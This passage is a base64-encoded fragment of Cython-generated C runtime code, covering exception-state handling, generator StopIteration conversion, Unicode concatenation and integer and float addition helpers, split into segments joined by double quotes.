nJfR2V0UmFpc2VkRXhjZXB0aW9uKCk7CiNlbHNlCiAgICBQeUVycl9GZXRjaCgmbG9jYWxfdHlwZSwgJmxvY2FsX3ZhbHVlLCAmbG9jYWxfdGIpOwojZW5kaWYKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPiAweDAzMEMwMDAwCiAgICBpZiAobGlrZWx5KGxvY2FsX3ZhbHVlKSkgewogICAgICAgIGxvY2FsX3R5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKGxvY2FsX3ZhbHVlKTsKICAgICAgICBQeV9JTkNSRUYobG9jYWxfdHlwZSk7CiAgICAgICAgbG9jYWxfdGIgPSBQeUV4Y2VwdGlvbl9HZXRUcmFjZWJhY2sobG9jYWxfdmFsdWUpOwogICAgfQoj""ZWxzZQogICAgUHlFcnJfTm9ybWFsaXplRXhjZXB0aW9uKCZsb2NhbF90eXBlLCAmbG9jYWxfdmFsdWUsICZsb2NhbF90Yik7CiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKICAgIGlmICh1bmxpa2VseSh0c3RhdGUtPmN1cmV4Y190eXBlKSkKI2Vsc2UKICAgIGlmICh1bmxpa2VseShQeUVycl9PY2N1cnJlZCgpKSkKI2VuZGlmCiAgICAgICAgZ290byBiYWQ7CiAgICBpZiAobG9jYWxfdGIpIHsKICAgICAgICBpZiAodW5saWtlbHkoUHlFeGNlcHRpb25fU2V0VHJhY2ViYWNrKGxvY2FsX3ZhbHVlLCBsb2NhbF90YikgPCAwKSkKICAgICAgICAgICAgZ290byBiYWQ7CiAgICB9CiNlbmRpZiAvLyBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID4gMHgwMzBDMDAwMAogICAgUHlfWElOQ1JFRihsb2NhbF90Yik7CiAgICBQeV9YSU5DUkVGKGxvY2FsX3R5cGUpOwogICAgUHlfWElOQ1JFRihsb2NhbF92YWx1ZSk7CiAgICAqdHlwZSA9IGxvY2FsX3R5cGU7CiAgICAqdmFsdWUgPSBsb2NhbF92YWx1ZTsKICAgICp0YiA9IGxvY2FsX3RiOwojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiAgICAjaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSwogICAgewogICAgICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gdHN0YXRlLT5leGNfaW5mbzsKICAgICAgI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQjAwYTQKICAgICAgICB0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlOwogICAgICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSBsb2NhbF92YWx1ZTsKICAgICAgICB0bXBfdHlwZSA9IE5VTEw7CiAgICAgICAgdG1wX3RiID0gTlVMTDsKICAgICAgICBQeV9YREVDUkVGKGxvY2FsX3R5cGUpOwogICAgICAgIFB5X1hERUNSRUYobG9jYWxfdGIpOwogICAgICAjZWxzZQogICAgICAgIHRtcF90eXBlID0gZXhjX2luZm8tPmV4Y190eXBlOwogICAgICAgIHRtcF92YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7CiAgICAgICAgdG1wX3RiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7CiAgICAgICAgZXhjX2luZm8tPmV4Y190eXBlID0gbG9jYWxfdHlwZTsKICAgICAgICBleGNfaW5mby0+ZXhjX3ZhbHVlID0gbG9jYWxfdmFsdWU7CiAgICAgICAgZXhjX2luZm8tPmV4Y190cmFjZWJhY2sgPSBsb2NhbF90YjsKICAgICAgI2VuZGlmCiAgICB9CiAgICAjZWxzZQogICAgdG1wX3R5cGUgPSB0c3RhdGUtPmV4Y190eXBlOwogICAgdG1wX3ZhbHVlID0gdHN0YXRlLT5leGNfdmFsdWU7CiAgICB0bXBfdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7CiAgICB0c3RhdGUtPmV4Y190eXBlID0gbG9jYWxfdHlwZTsKICAgIHRzdGF0ZS0+ZXhjX3ZhbHVlID0gbG9jYWxfdmFsdWU7CiAgICB0c3RhdGUtPmV4Y190cmFjZWJhY2sgPSBsb2NhbF90YjsKICAgICNlbmRpZgogICAgUHlfWERFQ1JFRih0bXBfdHlwZSk7CiAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7CiAgICBQeV9YREVDUkVGKHRtcF90Yik7CiNlbGlmIF9fUFlYX0xJTUlU""RURfVkVSU0lPTl9IRVggPj0gMHgwMzBiMDAwMAogICAgUHlFcnJfU2V0SGFuZGxlZEV4Y2VwdGlvbihsb2NhbF92YWx1ZSk7CiAgICBQeV9YREVDUkVGKGxvY2FsX3ZhbHVlKTsKICAgIFB5X1hERUNSRUYobG9jYWxfdHlwZSk7CiAgICBQeV9YREVDUkVGKGxvY2FsX3RiKTsKI2Vsc2UKICAgIFB5RXJyX1NldEV4Y0luZm8obG9jYWxfdHlwZSwgbG9jYWxfdmFsdWUsIGxvY2FsX3RiKTsKI2VuZGlmCiAgICByZXR1cm4gMDsKI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPD0gMHgwMzBDMDAwMApiYWQ6CiAgICAqdHlwZSA9IDA7CiAgICAqdmFsdWUgPSAwOwogICAgKnRiID0gMDsKICAgIFB5X1hERUNSRUYobG9jYWxfdHlwZSk7CiAgICBQeV9YREVDUkVGKGxvY2FsX3ZhbHVlKTsKICAgIFB5X1hERUNSRUYobG9jYWxfdGIpOwogICAgcmV0dXJuIC0xOwojZW5kaWYKfQoKCnN0YXRpYyB2b2lkIF9fUHl4X0dlbmVyYXRvcl9SZXBsYWNlX1N0b3BJdGVyYXRpb24oaW50IGluX2FzeW5jX2dlbikgewogICAgUHlPYmplY3QgKmV4YywgKnZhbCwgKnRiLCAqY3VyX2V4YywgKm5ld19leGM7CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgIGludCBpc19hc3luY19zdG9waXRlcmF0aW9uID0gMDsKICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGluX2FzeW5jX2dlbik7CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2Fzc2lnbgogICAgY3VyX2V4YyA9IF9fUHl4X1B5RXJyX0N1cnJlbnRFeGNlcHRpb25UeXBlKCk7CiAgICBpZiAobGlrZWx5KCFfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoY3VyX2V4YywgUHlFeGNfU3RvcEl0ZXJhdGlvbikpKSB7CiAgICAgICAgaWYgKGluX2FzeW5jX2dlbiAmJiB1bmxpa2VseShfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoY3VyX2V4YywgUHlFeGNfU3RvcEFzeW5jSXRlcmF0aW9uKSkpIHsKICAgICAgICAgICAgaXNfYXN5bmNfc3RvcGl0ZXJhdGlvbiA9IDE7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgIH0KICAgIF9fUHl4X0dldEV4Y2VwdGlvbigmZXhjLCAmdmFsLCAmdGIpOwogICAgUHlfWERFQ1JFRihleGMpOwogICAgUHlfWERFQ1JFRih0Yik7CiAgICBuZXdfZXhjID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uKFB5RXhjX1J1bnRpbWVFcnJvciwgInMiLAogICAgICAgIGlzX2FzeW5jX3N0b3BpdGVyYXRpb24gPyAiYXN5bmMgZ2VuZXJhdG9yIHJhaXNlZCBTdG9wQXN5bmNJdGVyYXRpb24iIDoKICAgICAgICBpbl9hc3luY19nZW4gPyAiYXN5bmMgZ2VuZXJhdG9yIHJhaXNlZCBTdG9wSXRlcmF0aW9uIiA6CiAgICAgICAgImdlbmVyYXRvciByYWlzZWQgU3RvcEl0ZXJhdGlvbiIpOwogICAgaWYgKCFuZXdfZXhjKSB7CiAgICAgICAgUHlfWERFQ1JFRih2YWwpOwogICAgICAgIHJldHVybjsKICAgIH0KICAgIFB5RXhjZXB0aW9uX1NldENhdXNlKG5ld19leGMsIHZhbCk7IC8vIHN0ZWFscyByZWYgdG8gdmFsCiAg""ICBQeUVycl9TZXRPYmplY3QoUHlFeGNfUnVudGltZUVycm9yLCBuZXdfZXhjKTsKfQoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeVVuaWNvZGVfVW5pY29kZShQeU9iamVjdCAqb2JqKSB7CiAgICBpZiAodW5saWtlbHkob2JqID09IFB5X05vbmUpKQogICAgICAgIG9iaiA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfTm9uZTsKICAgIHJldHVybiBfX1B5eF9OZXdSZWYob2JqKTsKfQoKCiMgaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCnN0YXRpYyBpbnQKX19QeXhfdW5pY29kZV9tb2RpZmlhYmxlKFB5T2JqZWN0ICp1bmljb2RlKQp7CiAgICBpZiAoUHlfUkVGQ05UKHVuaWNvZGUpICE9IDEpCiAgICAgICAgcmV0dXJuIDA7CiAgICBpZiAoIVB5VW5pY29kZV9DaGVja0V4YWN0KHVuaWNvZGUpKQogICAgICAgIHJldHVybiAwOwogICAgaWYgKFB5VW5pY29kZV9DSEVDS19JTlRFUk5FRCh1bmljb2RlKSkKICAgICAgICByZXR1cm4gMDsKICAgIHJldHVybiAxOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZUltcGwoUHlPYmplY3QgKipwX2xlZnQsIFB5T2JqZWN0ICpyaWdodAogICAgICAgICNpZiBDWVRIT05fUkVGTkFOTlkKICAgICAgICAsIHZvaWQqIF9fcHl4X3JlZm5hbm55CiAgICAgICAgI2VuZGlmCiAgICApIHsKICAgIFB5T2JqZWN0ICpsZWZ0ID0gKnBfbGVmdDsKICAgIFB5X3NzaXplX3QgbGVmdF9sZW4sIHJpZ2h0X2xlbiwgbmV3X2xlbjsKICAgIGlmICh1bmxpa2VseShfX1B5eF9QeVVuaWNvZGVfUkVBRFkobGVmdCkgPT0gLTEpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5VW5pY29kZV9SRUFEWShyaWdodCkgPT0gLTEpKQogICAgICAgIHJldHVybiBOVUxMOwogICAgbGVmdF9sZW4gPSBQeVVuaWNvZGVfR0VUX0xFTkdUSChsZWZ0KTsKICAgIGlmIChsZWZ0X2xlbiA9PSAwKSB7CiAgICAgICAgUHlfSU5DUkVGKHJpZ2h0KTsKICAgICAgICByZXR1cm4gcmlnaHQ7CiAgICB9CiAgICByaWdodF9sZW4gPSBQeVVuaWNvZGVfR0VUX0xFTkdUSChyaWdodCk7CiAgICBpZiAocmlnaHRfbGVuID09IDApIHsKICAgICAgICBQeV9JTkNSRUYobGVmdCk7CiAgICAgICAgcmV0dXJuIGxlZnQ7CiAgICB9CiAgICBpZiAodW5saWtlbHkobGVmdF9sZW4gPiBQWV9TU0laRV9UX01BWCAtIHJpZ2h0X2xlbikpIHsKICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvciwKICAgICAgICAgICAgICAgICAgICAgICAgInN0cmluZ3MgYXJlIHRvbyBsYXJnZSB0byBjb25jYXQiKTsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIG5ld19sZW4gPSBsZWZ0X2xlbiArIHJpZ2h0X2xlbjsKICAgIGlmIChfX1B5eF91bmljb2RlX21vZGlmaWFibGUobGVmdCkKICAgICAgICAgICAgJiYgUHlVbmljb2RlX0NoZWNrRXhhY3QocmlnaHQpCiAgICAgICAgICAgICYmIFB5VW5p""Y29kZV9LSU5EKHJpZ2h0KSA8PSBQeVVuaWNvZGVfS0lORChsZWZ0KQogICAgICAgICAgICAmJiAhKFB5VW5pY29kZV9JU19BU0NJSShsZWZ0KSAmJiAhUHlVbmljb2RlX0lTX0FTQ0lJKHJpZ2h0KSkpIHsKICAgICAgICBpbnQgcmV0OwogICAgICAgIF9fUHl4X0dJVkVSRUYoKnBfbGVmdCk7CiAgICAgICAgcmV0ID0gUHlVbmljb2RlX1Jlc2l6ZShwX2xlZnQsIG5ld19sZW4pOwogICAgICAgIF9fUHl4X0dPVFJFRigqcF9sZWZ0KTsKICAgICAgICBpZiAodW5saWtlbHkocmV0ICE9IDApKQogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgICAgICAjaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgICAgIGlmICh1bmxpa2VseShQeVVuaWNvZGVfQ29weUNoYXJhY3RlcnMoKnBfbGVmdCwgbGVmdF9sZW4sIHJpZ2h0LCAwLCByaWdodF9sZW4pIDwgMCkpIHJldHVybiBOVUxMOwogICAgICAgICNlbHNlCiAgICAgICAgX1B5VW5pY29kZV9GYXN0Q29weUNoYXJhY3RlcnMoKnBfbGVmdCwgbGVmdF9sZW4sIHJpZ2h0LCAwLCByaWdodF9sZW4pOwogICAgICAgICNlbmRpZgogICAgICAgIF9fUHl4X0lOQ1JFRigqcF9sZWZ0KTsKICAgICAgICBfX1B5eF9HSVZFUkVGKCpwX2xlZnQpOwogICAgICAgIHJldHVybiAqcF9sZWZ0OwogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gX19QeXhfUHlVbmljb2RlX0NvbmNhdChsZWZ0LCByaWdodCk7CiAgICB9CiAgfQojZW5kaWYKCgojaWYgIUNZVEhPTl9WRUNUT1JDQUxMIHx8IFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMApzdGF0aWMgUHlPYmplY3QgKl9fUHl4X09iamVjdF9WZWN0b3JjYWxsTWV0aG9kX0NhbGxGcm9tQnVpbGRlcihQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcykgewogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIFB5T2JqZWN0ICpvYmogPSBQeU9iamVjdF9HZXRBdHRyKGFyZ3NbMF0sIG5hbWUpOwogICAgaWYgKHVubGlrZWx5KCFvYmopKQogICAgICAgIHJldHVybiBOVUxMOwogICAgcmVzdWx0ID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKG9iaiwgYXJncysxLCBuYXJnc2YtMSwga3duYW1lcyk7CiAgICBQeV9ERUNSRUYob2JqKTsKICAgIHJldHVybiByZXN1bHQ7Cn0KI2VuZGlmCgoKI2lmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAmJiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X19QeU9iamVjdF9Mb29rdXBTcGVjaWFsKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBhdHRyX25hbWUsIGludCB3aXRoX2Vycm9yKSB7CiAgICBQeU9iamVjdCAqcmVzOwogICAgUHlUeXBlT2JqZWN0ICp0cCA9IFB5X1RZUEUob2JqKTsKICAgIHJlcyA9IF9QeVR5cGVfTG9va3VwKHRwLCBhdHRyX25hbWUpOwogICAgaWYgKGxpa2VseShyZXMpKSB7CiAgICAgICAgZGVzY3JnZXRmdW5jIGYgPSBQeV9UWVBFKHJl""cyktPnRwX2Rlc2NyX2dldDsKICAgICAgICBpZiAoIWYpIHsKICAgICAgICAgICAgUHlfSU5DUkVGKHJlcyk7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmVzID0gZihyZXMsIG9iaiwgKFB5T2JqZWN0ICopdHApOwogICAgICAgIH0KICAgIH0gZWxzZSBpZiAod2l0aF9lcnJvcikgewogICAgICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19BdHRyaWJ1dGVFcnJvciwgYXR0cl9uYW1lKTsKICAgIH0KICAgIHJldHVybiByZXM7Cn0KI2VuZGlmCgoKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9GYWxsYmFja19fX1B5eF9QeUxvbmdfQWRkT2JqQyhQeU9iamVjdCAqb3AxLCBQeU9iamVjdCAqb3AyLCBpbnQgaW5wbGFjZSkgewogICAgcmV0dXJuIChpbnBsYWNlID8gUHlOdW1iZXJfSW5QbGFjZUFkZCA6IFB5TnVtYmVyX0FkZCkob3AxLCBvcDIpOwp9CiNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9VbnBhY2tlZF9fX1B5eF9QeUxvbmdfQWRkT2JqQyhQeU9iamVjdCAqb3AxLCBQeU9iamVjdCAqb3AyLCBsb25nIGludHZhbCwgaW50IGlucGxhY2UsIGludCB6ZXJvZGl2aXNpb25fY2hlY2spIHsKICAgIENZVEhPTl9NQVlCRV9VTlVTRURfVkFSKGlucGxhY2UpOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoemVyb2RpdmlzaW9uX2NoZWNrKTsKICAgIGNvbnN0IGxvbmcgYiA9IGludHZhbDsKICAgIGxvbmcgYSwgeDsKI2lmZGVmIEhBVkVfTE9OR19MT05HCiAgICBjb25zdCBQWV9MT05HX0xPTkcgbGxiID0gaW50dmFsOwogICAgUFlfTE9OR19MT05HIGxsYSwgbGx4OwojZW5kaWYKICAgIGlmICh1bmxpa2VseShfX1B5eF9QeUxvbmdfSXNaZXJvKG9wMSkpKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihvcDIpOwogICAgfQogICAgaWYgKGxpa2VseShfX1B5eF9QeUxvbmdfSXNDb21wYWN0KG9wMSkpKSB7CiAgICAgICAgYSA9IF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUob3AxKTsKICAgIH0gZWxzZSB7CiAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMob3AxKTsKICAgICAgICBjb25zdCBQeV9zc2l6ZV90IHNpemUgPSBfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudChvcDEpOwogICAgICAgIHN3aXRjaCAoc2l6ZSkgewogICAgICAgICAgICBjYXNlIC0yOgogICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGEgPSAtKGxvbmcpICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gMiAqIFB5""TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IC0oUFlfTE9OR19MT05HKSAoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGdvdG8gbG9uZ19sb25nOwogICAgICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgICAgICAgICBhID0gKGxvbmcpICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IChQWV9MT05HX0xPTkcpICgoKCgodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgZ290byBsb25nX2xvbmc7CiAgICAgICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICAgICAgY2FzZSAtMzoKICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpIHsKICAgICAgICAgICAgICAgICAgICBhID0gLShsb25nKSAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IC0oUFlfTE9OR19MT05HKSAoKCgoKCgodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBnb3RvIGxvbmdfbG9uZzsKICAgICAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgfQogICAgICAg""ICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgICAgICBjYXNlIDM6CiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICAgICAgICAgYSA9IChsb25nKSAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IChQWV9MT05HX0xPTkcpICgoKCgoKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgIGdvdG8gbG9uZ19sb25nOwogICAgICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgICAgIGNhc2UgLTQ6CiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSB7CiAgICAgICAgICAgICAgICAgICAgYSA9IC0obG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IC0oUFlfTE9OR19MT05HKSAoKCgoKCgoKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgZ290byBsb25nX2xvbmc7CiAgICAgICAgICAgICAgICAjZW5kaWYKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsK""ICAgICAgICAgICAgY2FzZSA0OgogICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGEgPSAobG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkgewogICAgICAgICAgICAgICAgICAgIGxsYSA9IChQWV9MT05HX0xPTkcpICgoKCgoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICBnb3RvIGxvbmdfbG9uZzsKICAgICAgICAgICAgICAgICNlbmRpZgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgICAgICBkZWZhdWx0OiByZXR1cm4gUHlMb25nX1R5cGUudHBfYXNfbnVtYmVyLT5uYl9hZGQob3AxLCBvcDIpOwogICAgICAgIH0KICAgIH0KICAgICAgICAgICAgeCA9IGEgKyBiOwogICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmcoeCk7CiNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgbG9uZ19sb25nOgogICAgICAgICAgICBsbHggPSBsbGEgKyBsbGI7CiAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTG9uZ0xvbmcobGx4KTsKI2VuZGlmCiAgICByZXR1cm4gX19QeXhfRmFsbGJhY2tfX19QeXhfUHlMb25nX0FkZE9iakMob3AxLCBvcDIsIGlucGxhY2UpOwogICAgCiAgICAKfQojZW5kaWYKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9GbG9hdF9fX1B5eF9QeUxvbmdfQWRkT2JqQyhQeU9iamVjdCAqZmxvYXRfdmFsLCBsb25nIGludHZhbCwgaW50IHplcm9kaXZpc2lvbl9jaGVjaykgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoemVyb2RpdmlzaW9uX2NoZWNrKTsKICAgIGNvbnN0IGxvbmcgYiA9IGludHZhbDsKICAgIGRvdWJsZSBhID0gX19QeXhfUHlGbG9hdF9BU19ET1VCTEUoZmxvYXRfdmFsKTsKICAgICAgICBkb3VibGUgcmVzdWx0OwogICAgICAgIAogICAgICAgIHJlc3VsdCA9ICgoZG91YmxlKWEpICsgKGRvdWJsZSliOwogICAgICAgIHJldHVybiBQeUZsb2F0X0Zyb21Eb3VibGUocmVzdWx0